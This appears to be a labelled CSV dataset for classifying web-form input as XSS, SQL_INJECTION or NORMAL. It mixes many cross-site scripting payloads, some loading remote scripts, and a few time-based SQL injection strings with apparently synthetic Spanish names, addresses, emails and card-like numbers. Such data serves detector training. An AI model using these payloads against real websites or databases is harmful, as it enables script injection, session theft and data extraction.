payload,length,label
"<img src=javascript:alert(""crosssitescripting"")>"";' >",53,XSS
"<script>alert(""crosssitescripting"")</script>"";' >",49,XSS
"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>",100,XSS
"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>",425,XSS
<script src=http://vulnerability-lab.com/crosssitescripting.js></script>,72,XSS
"<<script>alert(""crosssitescripting"");//<</script>",49,XSS
<script src=//vulnerability-lab.com/.js>,40,XSS
<script>a=/crosssitescripting/ alert(a.source)</script>,55,XSS
"<script a=`>` src=""http://vulnerability-lab.com/crosssitescripting.js""></script>",80,XSS
"<script>document.write(""<scri"");</script>pt src=""http://vulnerability-lab.com/crosssitescripting.js""></script>",110,XSS
"<img src=""javascript:alert('crosssitescripting');"">",51,XSS
<img src=javascript:alert('crosssitescripting')>,48,XSS
"<img src=`javascript:alert(""rm'crosssitescripting'"")`>",54,XSS
"<img """"""><script>alert(""crosssitescripting"")</script>"">",55,XSS
"<img src=""jav ascript:alert('crosssitescripting');"">",52,XSS
"<img src="" javascript:alert('crosssitescripting');"">",52,XSS
"<img dynsrc=""javascript:alert('crosssitescripting')"">",53,XSS
"<img lowsrc=""javascript:alert('crosssitescripting')"">",53,XSS
"<img src=""mocha:[code]"">",24,XSS
"<img src=""livescript:[code]"">",29,XSS
"<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k"">",106,XSS
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('crosssitescripting');"">",96,XSS
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('crosssitescripting')</script>"">",92,XSS
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('crosssitescripting');+adw-/script+ad4-",142,XSS
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>,129,XSS
"<style>@im\\port'\\ja asc ipt:alert(""crosssitescripting"")';</style>",67,XSS
"<style type=""text/javascript"">alert('crosssitescripting');</style>",66,XSS
"<style>.crosssitescripting{background-image:url(""javascript:alert('crosssitescripting')"");}</style><a class=crosssitescripting></a>",131,XSS
"<style>li {list-style-image: url(""javascript:alert('crosssitescripting')"");}</style><ul><li>crosssitescripting",110,XSS
"<style>body{-moz-binding:url(""http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting"")}</style>",114,XSS
"<div style=""background-image:52c8'a161332904a1c5248.10278.1053379'9"">",69,XSS
"<div style=""width: expression(alert('crosssitescripting'));"">",61,XSS
"<link rel=""stylesheet"" href=""javascript:alert('crosssitescripting');"">",70,XSS
"<link rel=""stylesheet"" href=""http://vulnerability-lab.com/crosssitescripting.css"">",82,XSS
<body onload=alert('crosssitescripting')>,41,XSS
"<img low id=xss src=""javascript:alert('xss')"">",46,XSS
"<link rel=""stylesheet"" href=""javascript:alert('xss');"">",55,XSS
"<img id=xss src='vbscript:msgbox(""xss"")'>",41,XSS
"<table id=xss background=""javascript:alert('xss')"">",51,XSS
"<table id=xss><td background=""javascript:alert('xss')"">",55,XSS
"<div id=xss style=""width: expression(alert('xss'));"">",53,XSS
"<iframe id=xss src=""javascript:alert('xss');""></iframe>",55,XSS
"<table background=""javascript:alert('xss')"">",44,XSS
"<table><td background=""javascript:alert('xss')"">""",49,XSS
"<img id=xss style=""xss:expr/*xss*/ession(alert('xss'))"">",56,XSS
"<style type=""text/javascript"">alert('xss');</style>",51,XSS
"<style type=""text/css"">body{background:url(""javascript:alert('xss')"")}</style>",78,XSS
"<base href=""javascript:alert('xss');//"">",40,XSS
"a=""get"";b=""url("""";c=""javascript:"";d=""alert('xss');"")"";eval(a+b+c+d);",68,XSS
"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>",156,XSS
"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>",100,XSS
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert(""xss"")</script>""></body></html>",221,XSS
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('xss')</script>"">",77,XSS
<script id=xss src=http://127.0.0.1></script>,45,XSS
"<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>",64,XSS
"<img id=xss src=""&14;javascript:alert('xss');"">",47,XSS
"<iframe id=xss src=""javascript:alert('xss'); <",46,XSS
<script>a=/xss/nalert('xss');</script>,38,XSS
"<div style=""background-image: url(javascript:alert('xss'));"">",61,XSS
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""></head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",126,XSS
"<div onmouseover=""alert('xss');"">,",34,XSS
"<input type=""image"" dynid=xss src=""javascript:alert('xss');"">",61,XSS
<img id=xss src=&{alert('xss');};>,34,XSS
"<a id=xss href=""about:<script>alert('xss');</script>"">",54,XSS
"<object classid=clsid:..."" codebase=""javascript:alert('xss');"">",63,XSS
<style><!--</style><script>alert('xss');//--></script>,54,XSS
<!-- -- --><script>alert('xss');</script><!-- -- -->,52,XSS
"<img id=xss src=""blah""onmouseover=""alert('xss');"">",50,XSS
"<xml id=""x""><a><b><script>alert('xss');</script>;<b></a></xml>",62,XSS
"<div datafld=""b"" dataformatas=""html"" dataid=xss src=""#xss""></div>",65,XSS
"<xml id=i><x><c><![cdata[<img id=xss src=""javas]]<![cdata[cript:alert('xss');"">]]</c><x></xml>",94,XSS
"<form id=""test"" /><button form=""test"" formaction=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">x",139,XSS
"<select id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",120,XSS
"<textarea id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>",122,XSS
"<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>",135,XSS
"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//",109,XSS
"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">",112,XSS
"<video onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))""><source>",112,XSS
"<iframe id=xss / ""onload=alert(/xss/)></iframe>",47,XSS
<iframe id=xss///////onload=alert(/xss/)></iframe>,50,XSS
<iframe id=xss <?php echo chr(11)?> onload=alert(/xss/)></iframe>,65,XSS
<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>,65,XSS
""" onblur=alert(xss) ""> <""",25,XSS
""" onmouseover=alert(xss) "">",27,XSS
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",80,XSS
"</textarea>'""><script>alert(xss)</script>",41,XSS
</script></script><<<<script><>>>><<<script>alert(xss)</script>,63,XSS
<html><noalert><noscript>(xss)</noscript><script>(xss)</script>,63,XSS
}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,60,XSS
"<script>document.write(""xss"");</script>",39,XSS
"='><script>alert(""xss"")</script>",32,XSS
"<body background=javascript:'""><script>alert(xss)</script>></body>",66,XSS
<script>alert('xss');</script>,30,XSS
<script id=xss src=http://ha.ckers.org/xss.js></script>,55,XSS
id=xss src= <img 6;avascript:alert('xss')>,42,XSS
"<script/xss id=xss src=""http://ha.ckers.org/xss.js""></script>",61,XSS
"<img id=xss src=""javascript:alert('xss')""",41,XSS
<script>a=/xss/,15,XSS
"<img lowid=xss src=""javascript:alert('xss')"">",45,XSS
"<br size=""&{alert('xss')}"">",27,XSS
"<link rel=""stylesheet"" href=""http://ha.ckers.org/xss.css"">",58,XSS
<style>@import'http://ha.ckers.org/xss.css';</style>,52,XSS
"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>",75,XSS
"<img id=xss src=""mocha:[code]"">",31,XSS
"<meta http-equiv=""link"" content=""<javascript:alert('xss')>; rel=stylesheet"">",76,XSS
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('xss');"">",81,XSS
"<div style=""width: expression(alert('xss'));"">",46,XSS
"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",49,XSS
"exp/*<xss style='no\\xss:noxss(""*//*"");",39,XSS
"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",83,XSS
"a=""get"";",8,XSS
"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",97,XSS
"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>",58,XSS
"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->",110,XSS
"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('xss');+adw-/script+ad4-",127,XSS
"<script a="">"" id=xss src=""http://ha.ckers.org/xss.js""></script>",63,XSS
"<script ""a='>'"" id=xss src=""http://ha.ckers.org/xss.js""></script>",65,XSS
"<script a=`>` id=xss src=""http://ha.ckers.org/xss.js""></script>",63,XSS
40184,5,NORMAL
nuda drudes,11,NORMAL
"c/ del ferrocarril, 152,",24,NORMAL
2070765320009143,16,NORMAL
1902,4,NORMAL
ulldemol bujeque,16,NORMAL
plaa caudillo 60,16,NORMAL
maala8,6,NORMAL
peuela sains,12,NORMAL
"c/ 57 15, 9g",12,NORMAL
empeltre,8,NORMAL
estantalar,10,NORMAL
21924971z,9,NORMAL
25260,5,NORMAL
h9655,5,NORMAL
dunlap-leaud@videospornocaseros.ye,34,NORMAL
"pobla de montorns, la",21,NORMAL
kong-que,8,NORMAL
goggin,6,NORMAL
plebs cadevall,14,NORMAL
cueva de montesinos 80 11-g,27,NORMAL
xiangsen,8,NORMAL
01633578a,9,NORMAL
5562206225092204,16,NORMAL
4377,4,NORMAL
molledo basagaa,15,NORMAL
carretera de las ermitas 188,28,NORMAL
lauriaul,8,NORMAL
nype.shafer@canovash.bv,23,NORMAL
merindad de ro ubierna,22,NORMAL
robieux,7,NORMAL
darby,5,NORMAL
thalasso.chappell@titulosoficiales.jp,37,NORMAL
0350022340129740,16,NORMAL
julisa,6,NORMAL
03266253t,9,NORMAL
0992218178104844,16,NORMAL
5788,4,NORMAL
graziana,8,NORMAL
16648,5,NORMAL
07u8e37ia,9,NORMAL
07901950r,9,NORMAL
39638,5,NORMAL
portal,6,NORMAL
marino,6,NORMAL
c/ garcia morente 129,21,NORMAL
2533839429419532,16,NORMAL
natn,4,NORMAL
68201502q,9,NORMAL
36680,5,NORMAL
*r6t58a,7,NORMAL
r8cid0va,8,NORMAL
14977979b,9,NORMAL
45183,5,NORMAL
d2s7sp79ro,10,NORMAL
spiegel-haake@convention.no,27,NORMAL
turcia,6,NORMAL
r92e1*56e,9,NORMAL
pu6ue97,7,NORMAL
72367579b,9,NORMAL
1721278325772936,16,NORMAL
starr-fjelmose@cdgranadabaila.travel,36,NORMAL
47815,5,NORMAL
2354,4,NORMAL
raian,5,NORMAL
78977050h,9,NORMAL
24224,5,NORMAL
58772485x,9,NORMAL
39515,5,NORMAL
zanquita,8,NORMAL
14ab214c6n,10,NORMAL
quartet@cabare.com.cs,21,NORMAL
espluga de francol l',21,NORMAL
acre,4,NORMAL
52137467d,9,NORMAL
31282,5,NORMAL
62si27t8ico,11,NORMAL
encrasar,8,NORMAL
86943454g,9,NORMAL
lubna,5,NORMAL
pealver palenzuela,18,NORMAL
zabalza,7,NORMAL
erickson,8,NORMAL
procacci,8,NORMAL
conde,5,NORMAL
25330,5,NORMAL
mialgi5,7,NORMAL
pablo iglesias s/n 2?f,22,NORMAL
technoso,8,NORMAL
briseboi,8,NORMAL
39699852n,9,NORMAL
37115,5,NORMAL
comisorio,9,NORMAL
pesche@campodegolf.com.sy,25,NORMAL
valseca,7,NORMAL
419747iv6,9,NORMAL
orientalista,12,NORMAL
sala@mystyleperfume.ls,22,NORMAL
7771884953425478,16,NORMAL
telema,6,NORMAL
25109956m,9,NORMAL
45370,5,NORMAL
arrego76arse,12,NORMAL
1i6p06ej7,9,NORMAL
54709157t,9,NORMAL
1571256483586961,16,NORMAL
sibonet,7,NORMAL
"estrada mendiarte s/n, 10?a",27,NORMAL
sa89gn,6,NORMAL
cojera,6,NORMAL
calle madagascar 130,20,NORMAL
ineluctable,11,NORMAL
pozzetto@miplat.am,18,NORMAL
cervera de la caada,19,NORMAL
havis,5,NORMAL
cooksey,7,NORMAL
gomero gallardo,15,NORMAL
"paratge ter, 33,",16,NORMAL
vial,4,NORMAL
37905890g,9,NORMAL
40529,5,NORMAL
encalador,9,NORMAL
ten.tar,7,NORMAL
vitola@23horas.ad,17,NORMAL
45810,5,NORMAL
desconsolar,11,NORMAL
infante juan manuel s/n 5?a,27,NORMAL
9738066615220073,16,NORMAL
blondell3,9,NORMAL
peller@arvigar.gs,17,NORMAL
49135,5,NORMAL
escultrico,10,NORMAL
69634179t,9,NORMAL
6689689469452036,16,NORMAL
3318,4,NORMAL
salgado pladellorens,20,NORMAL
villadoz,8,NORMAL
8ienne2s6,9,NORMAL
horcajo de montemayor,21,NORMAL
sensualmente,12,NORMAL
fabrizio,8,NORMAL
"c/ gravina, s/n",15,NORMAL
6453670410602968,16,NORMAL
iraola rudi,11,NORMAL
castellanos de zapardiel,24,NORMAL
-3136%') or 3400=6002,21,SQL_INJECTION
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,60,SQL_INJECTION
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",227,SQL_INJECTION
-2604)) as sekb where 6897=6897 or 1000=7683,44,SQL_INJECTION
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,51,SQL_INJECTION
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",134,SQL_INJECTION
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,203,SQL_INJECTION
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",104,SQL_INJECTION
tweddle,7,NORMAL
sirevici,8,NORMAL
90230020p,9,NORMAL
6034871098442134,16,NORMAL
vingelli9@custombikesclothes.fr,31,NORMAL
fuentelmonge,12,NORMAL
m*ule38,7,NORMAL
cimorra,7,NORMAL
knippenberg@soyriojano.cf,25,NORMAL
iza,3,NORMAL
martinn sampayo,15,NORMAL
"calle plantio, 178,",19,NORMAL
benning,7,NORMAL
sask,4,NORMAL
rudie@deuxmanagement.jo,23,NORMAL
guilas,6,NORMAL
ramblizo,8,NORMAL
8043015940180984,16,NORMAL
6087,4,NORMAL
stoeckel@hacia.sa,17,NORMAL
tossa de mar,12,NORMAL
rescisorio,10,NORMAL
valdemaluque,12,NORMAL
masahiro,8,NORMAL
humfrey,7,NORMAL
brines grimalda,15,NORMAL
"calle hernan cortes, 58,",24,NORMAL
38i2t702,8,NORMAL
"c/ reina del cielo 136, 8-d",27,NORMAL
09ca93a4i9lar,13,NORMAL
70p89c9cion958,14,NORMAL
drozdek.waechter@tarifasdevuelos.bj,35,NORMAL
villacastn,10,NORMAL
hans,4,NORMAL
30666350j,9,NORMAL
12965,5,NORMAL
vivie4,6,NORMAL
colosse@velaconsultores.gob,27,NORMAL
fuente de pedro naharro,23,NORMAL
inusitado,9,NORMAL
69557398q,9,NORMAL
beilul,6,NORMAL
hadel,5,NORMAL
brivio,6,NORMAL
ansa-sobrarbe,13,NORMAL
rebalg1r,8,NORMAL
88426780z,9,NORMAL
34111,5,NORMAL
2268,4,NORMAL
47355557y,9,NORMAL
5393761266970595,16,NORMAL
leonila,7,NORMAL
49511678s,9,NORMAL
08191,5,NORMAL
rosoli,6,NORMAL
tr?abal,7,NORMAL
plaza tilos s/n,15,NORMAL
7578225963562090,16,NORMAL
helano,6,NORMAL
20847295a,9,NORMAL
14140,5,NORMAL
544,3,NORMAL
arn cantisn,11,NORMAL
langa del castillo,18,NORMAL
jaswal,6,NORMAL
limongi diguez,14,NORMAL
pleitas,7,NORMAL
arme!lluela,11,NORMAL
menju,5,NORMAL
23251820q,9,NORMAL
06927,5,NORMAL
ezequiel,8,NORMAL
"calle alfaz del pi, 96 11?d",27,NORMAL
8198356178876064,16,NORMAL
3880,4,NORMAL
97230292t,9,NORMAL
28194,5,NORMAL
leonelo,7,NORMAL
83217349z,9,NORMAL
3413347210986966,16,NORMAL
3040,4,NORMAL
hindman@primeracasa-ebs.il,26,NORMAL
alarba,6,NORMAL
cowart,6,NORMAL
garrudo castellon,17,NORMAL
"calle pea 49, 9?b",17,NORMAL
merriell,8,NORMAL
alvean,6,NORMAL
16574331w,9,NORMAL
33001,5,NORMAL
roehn.kernke@eldeseodepecar.ec,30,NORMAL
8914644367191799,16,NORMAL
2049,4,NORMAL
hirn,4,NORMAL
"c/ mirra 25,",12,NORMAL
8648898617825850,16,NORMAL
nimia,5,NORMAL
"inocencia alayon, s/n 4-f",25,NORMAL
3227728964471059,16,NORMAL
3244,4,NORMAL
amarili,7,NORMAL
"c/ general merry del val, s/n",29,NORMAL
wa77en,6,NORMAL
50513,5,NORMAL
c7ada98o,8,NORMAL
tolera9lemen8e,14,NORMAL
byron@vinavilano.gl,19,NORMAL
45790,5,NORMAL
descote,7,NORMAL
14554532v,9,NORMAL
muth,4,NORMAL
neufeld,7,NORMAL
benson-rabasa@mareventsprotocolosocial.ad,41,NORMAL
urdiales del pramo,18,NORMAL
oti sineiro,11,NORMAL
avellanosa de mu,16,NORMAL
teddie,6,NORMAL
583opi4,7,NORMAL
radir@diagnosticoradiologico.mil,32,NORMAL
galende,7,NORMAL
vacher,6,NORMAL
77232447b,9,NORMAL
5399041434530750,16,NORMAL
8516,4,NORMAL
einar,5,NORMAL
"c/ la hoz, 17",13,NORMAL
sandie,6,NORMAL
pavlow@permutatucasa.fm,23,NORMAL
9438831900620350,16,NORMAL
1789,4,NORMAL
corico,6,NORMAL
"sayago, 156,",12,NORMAL
hocutt,6,NORMAL
garcez iturriria,16,NORMAL
"galeno 106, 9?c",15,NORMAL
8444341614355746,16,NORMAL
8436,4,NORMAL
donaciano,9,NORMAL
c/ guillen santacilla 94,24,NORMAL
harmonie,8,NORMAL
ikediek torrades,16,NORMAL
"oso, el",7,NORMAL
3andador4,9,NORMAL
demos3rativa,12,NORMAL
45854746z,9,NORMAL
08030,5,NORMAL
mairozio,8,NORMAL
78258633y,9,NORMAL
2930629510541352,16,NORMAL
iorgo,5,NORMAL
mouchet@007tv.fj,16,NORMAL
roelos de sayago,16,NORMAL
cabildeo,8,NORMAL
46942381w,9,NORMAL
17861,5,NORMAL
gravoso,7,NORMAL
e1bud8,6,NORMAL
gude1@messadivoce.ai,20,NORMAL
09228,5,NORMAL
torns,5,NORMAL
19783837l,9,NORMAL
09270,5,NORMAL
alatn,5,NORMAL
jernima,7,NORMAL
69653229y,9,NORMAL
14970,5,NORMAL
encuar,6,NORMAL
angele6@juegossonic.com.eh,26,NORMAL
uju,3,NORMAL
loudiadi,8,NORMAL
athony,6,NORMAL
bedmar,6,NORMAL
"calle doctor jose manuel pascual y pascual 146, 4?c",51,NORMAL
0936495801431480,16,NORMAL
ordezanka@arroyo-molinos.dj,27,NORMAL
49495,5,NORMAL
malandrn,8,NORMAL
fantaseadora,12,NORMAL
28045405x,9,NORMAL
18212,5,NORMAL
